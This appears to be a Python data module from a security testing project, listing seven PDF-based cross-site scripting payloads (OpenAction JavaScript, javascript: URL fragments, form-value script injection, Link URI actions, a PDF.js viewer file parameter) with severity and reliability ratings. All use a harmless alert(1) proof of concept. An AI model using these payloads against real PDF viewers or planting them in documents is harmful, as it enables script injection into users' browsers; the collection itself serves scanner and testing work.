#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

PDF XSS Payloads
XSS via PDF files and PDF.js
"""

from ..models import PayloadEntry


PDF_XSS_DATABASE = {
    # ===== PDF.JS XSS =====
    "pdf_js_001": PayloadEntry(
        payload="/OpenAction<</S/JavaScript/JS(app.alert(1))>>",
        contexts=["url"],
        tags=["pdf", "pdfjs", "openaction"],
        severity="high",
        cvss_score=7.5,
        description="PDF OpenAction JavaScript",
        reliability="medium",
    ),
    "pdf_js_002": PayloadEntry(
        payload="/AA<</O<</S/JavaScript/JS(app.alert(1))>>>>",
        contexts=["url"],
        tags=["pdf", "pdfjs"],
        severity="high",
        cvss_score=7.5,
        description="PDF Additional Action",
        reliability="medium",
    ),
    # ===== PDF URL FRAGMENT =====
    "pdf_fragment_001": PayloadEntry(
        payload="file.pdf#FDF=javascript:alert(1)",
        contexts=["url", "href"],
        tags=["pdf", "fragment"],
        severity="high",
        cvss_score=7.5,
        description="PDF FDF fragment XSS",
        reliability="low",
    ),
    "pdf_fragment_002": PayloadEntry(
        payload="file.pdf#javascript:alert(1)",
        contexts=["url", "href"],
        tags=["pdf", "fragment"],
        severity="high",
        cvss_score=7.5,
        description="PDF javascript fragment",
        reliability="low",
    ),
    # ===== PDF FORM XSS =====
    "pdf_form_001": PayloadEntry(
        payload='/V("><script>alert(1)</script>)',
        contexts=["url"],
        tags=["pdf", "form"],
        severity="high",
        cvss_score=7.5,
        description="PDF form value XSS",
        reliability="low",
    ),
    # ===== PDF EMBEDDED HTML =====
    "pdf_embed_001": PayloadEntry(
        payload="/Subtype/Link/A<</Type/Action/S/URI/URI(javascript:alert(1))>>",
        contexts=["url"],
        tags=["pdf", "link"],
        severity="high",
        cvss_score=7.5,
        description="PDF Link action XSS",
        reliability="medium",
    ),
    # ===== PDF VIEWER =====
    "pdf_viewer_001": PayloadEntry(
        payload="https://example.com/pdfjs/web/viewer.html?file=javascript:alert(1)",
        contexts=["url"],
        tags=["pdf", "pdfjs", "viewer"],
        severity="high",
        cvss_score=7.5,
        description="PDF.js viewer file param XSS",
        reliability="medium",
    ),
}

PDF_XSS_TOTAL = len(PDF_XSS_DATABASE)
